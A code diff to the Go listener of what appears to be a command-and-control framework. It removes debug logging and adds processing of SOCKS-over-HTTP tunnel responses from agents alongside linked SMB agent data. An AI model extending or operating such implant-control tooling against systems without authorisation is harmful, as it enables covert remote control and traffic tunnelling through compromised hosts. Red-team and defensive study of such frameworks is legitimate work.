@@ -2,6 +2,7 @@
 package listeners
 
 import (
+	"c2/internal/agent/socks_http"
 	"c2/internal/common/config"
 	"context"
 	"crypto/aes"
@@ -195,7 +196,6 @@ func (m *Manager) handleActiveConnection(w http.ResponseWriter, r *http.Request,
 	// Check for link data (data from linked SMB agents)
 	// Field name is configurable via smb_link.malleable.link_data_field
 	if linkData, ok := decryptedData[linkMalleable.LinkDataField].([]interface{}); ok && len(linkData) > 0 {
-		log.Printf("[Active Connection] Processing %d link data items from edge %s", len(linkData), conn.ClientID)
 		if err := m.processLinkData(ctx, tx, conn.ClientID, linkData); err != nil {
 			log.Printf("[Active Connection] Failed to process link data: %v", err)
 			// Don't fail the whole request, just log the error
@@ -205,12 +205,23 @@ func (m *Manager) handleActiveConnection(w http.ResponseWriter, r *http.Request,
 	// Check for link unlink notifications (when edge agent disconnects from SMB agent)
 	// Field name is configurable via smb_link.malleable.link_unlink_field
 	if luRaw, exists := decryptedData[linkMalleable.LinkUnlinkField]; exists {
-		log.Printf("[Active Connection] DEBUG: Found '%s' field in payload, type=%T, value=%v", linkMalleable.LinkUnlinkField, luRaw, luRaw)
 		if unlinkData, ok := luRaw.([]interface{}); ok && len(unlinkData) > 0 {
-			log.Printf("[Active Connection] Processing %d unlink notifications from edge %s", len(unlinkData), conn.ClientID)
 			m.processUnlinkNotifications(ctx, conn.ClientID, unlinkData)
-		} else {
-			log.Printf("[Active Connection] DEBUG: '%s' field type assertion to []interface{} failed", linkMalleable.LinkUnlinkField)
+		}
+	}
+
+	// Check for SOCKS HTTP responses ("sr" field)
+	if srRaw, exists := decryptedData["sr"]; exists {
+		if socksData, ok := srRaw.([]interface{}); ok && len(socksData) > 0 {
+			var responses []map[string]interface{}
+			for _, item := range socksData {
+				if m, ok := item.(map[string]interface{}); ok {
+					responses = append(responses, m)
+				}
+			}
+			if len(responses) > 0 {
+				socks_http.ProcessAgentResponses(agentID, responses)
+			}
 		}
 	}
 
